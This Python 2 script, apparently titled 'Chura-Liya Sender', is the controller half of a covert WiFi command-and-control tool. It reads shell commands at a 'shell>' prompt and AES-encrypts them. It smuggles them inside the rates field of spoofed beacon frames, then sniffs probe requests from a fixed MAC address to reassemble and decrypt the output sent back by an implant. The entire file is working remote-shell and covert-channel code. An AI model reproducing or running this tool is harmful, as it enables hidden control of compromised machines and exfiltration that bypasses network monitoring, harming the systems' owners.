#!/usr/bin/python

import zlib,os
from Crypto.Cipher import AES
import logging
import base64
import sys,hashlib
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import argparse

## Launcher options
parser = argparse.ArgumentParser(description='Chura-Liya Sender', prog='sender.py', usage='%(prog)s <Monitor Mode WiFi NIC> <Desired Password>')
parser.add_argument('Interface', type=str, help='WiFi NIC')
parser.add_argument('Password', type=str, help='Desired Password')

args = parser.parse_args()

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
unpad = lambda s : s[:-ord(s[len(s)-1:])]

class AESCipher:
    def __init__( self, key ):
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = os.urandom(AES.block_size)
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) ) 

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))

interface=args.Interface
password=args.Password
verbose=0
aes=AESCipher(password)

conf.verbose=verbose
conf.iface=interface
ssid=""
global msg,msglen
msg=""
msglen=0

def sniffProbe(p):
	global msg,msglen
	if p.haslayer(Dot11):
		if p.type == 0 and p.subtype == 4: # if management frame and probe-request
			if p.addr2 == "11:22:33:44:55:66":
				if ("PART"==p.info[:4]):
					piecepos=p.info.index("/")
					piece=p.info[4:piecepos]
					lenpos=p.info.index('|')
					msglen=p.info[piecepos+1:lenpos]
					sys.stdout.write("Receiving long message "+str(piece)+"/"+str(msglen)+"\r")
					sys.stdout.flush()
					if (piece==msglen):
						print ""
						msg+=p.info[lenpos:]
						print msg
						unenc=aes.decrypt(msg)
						try:
							uncomp=zlib.decompress(unenc)
							print uncomp
						except:
							print "ERROR - Wrong Password"
						msg=""
						msglen=0
					else:
						msg+=p.info[lenpos:]
				else:
					unenc=aes.decrypt(p.info)
					try:
						uncomp=zlib.decompress(unenc)
						print uncomp
					except:
						print "ERROR - Wrong Password"

def SendRates(rates):
	frame = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2="11:22:33:44:55:66",addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",len=len(ssid),info=ssid)/Dot11Elt(ID="Rates",info=rates)/Dot11Elt(ID="DSset",info="\x03")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
	sendp(frame, verbose=verbose)
	sniff(iface=interface, stop_filter=sniffProbe, store=0)

cmd = ""
while cmd != "exit":
	print "\n\nshell>",
	cmd = raw_input()
	if cmd != "exit":
		command=base64.b64encode(aes.encrypt(cmd))
		SendRates(command)

print "\nNice meeting you. Bye!!\n"

